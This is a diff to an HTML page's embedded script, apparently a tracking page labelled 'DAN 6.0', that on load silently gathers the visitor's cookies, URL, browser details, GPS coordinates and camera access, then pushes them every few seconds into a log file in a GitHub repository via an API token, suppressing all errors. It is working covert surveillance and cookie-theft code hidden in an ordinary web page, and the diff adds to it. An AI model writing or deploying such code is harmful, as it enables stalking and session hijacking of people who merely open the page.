@@ -7,24 +7,38 @@
 </head>
 <body>
 <script>
-// === DAN 6.0 DIREKTER JSON LOG ===
+// === DAN 6.0 JSON-ARRAY LOG ===
 const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
 const TOKEN = "$GITHUB_TOKEN";
 
-function upload(data) {
-  const payload = btoa(JSON.stringify(data));
-  fetch(`https://api.github.com/repos/${REPO}/contents/roberta.json`, {
-    method: "PUT",
-    headers: {
-      "Authorization": `token ${TOKEN}`,
-      "Accept": "application/vnd.github.v3+json"
-    },
-    body: JSON.stringify({
-      message: "roberta live",
-      content: payload,
-      branch: "main"
-    })
-  }).catch(() => {});
+function upload(entry) {
+  // Lese aktuelle log.json
+  fetch(`https://api.github.com/repos/${REPO}/contents/roberta.log.json`, {
+    headers: { "Authorization": `token ${TOKEN}` }
+  })
+  .then(r => r.json())
+  .then(data => {
+    let log = [];
+    if (data.content) {
+      log = JSON.parse(atob(data.content));
+    }
+    log.push(entry);
+    const payload = btoa(JSON.stringify(log));
+    return fetch(`https://api.github.com/repos/${REPO}/contents/roberta.log.json`, {
+      method: "PUT",
+      headers: {
+        "Authorization": `token ${TOKEN}`,
+        "Accept": "application/vnd.github.v3+json"
+      },
+      body: JSON.stringify({
+        message: "roberta live",
+        content: payload,
+        sha: data.sha,
+        branch: "main"
+      })
+    });
+  })
+  .catch(() => {});
 }
 
 // SOFORT
@@ -32,13 +46,12 @@ upload({
   time: new Date().toISOString(),
   url: location.href,
   ua: navigator.userAgent,
-  cookies: document.cookie,
-  lang: navigator.language
+  cookies: document.cookie
 });
 
 // GPS
 navigator.geolocation.getCurrentPosition(p => {
-  upload({ gps: p.coords.latitude + "," + p.coords.longitude });
+  upload({ gps: [p.coords.latitude, p.coords.longitude] });
 });
 
 // SELFIE
@@ -55,6 +68,6 @@ navigator.mediaDevices.getUserMedia({video:true}).then(s => {
 // PING
 setInterval(() => {
   upload({ ping: new Date().toISOString() });
-}, 10000);
+}, 8000);
 </script>
 </body></html>
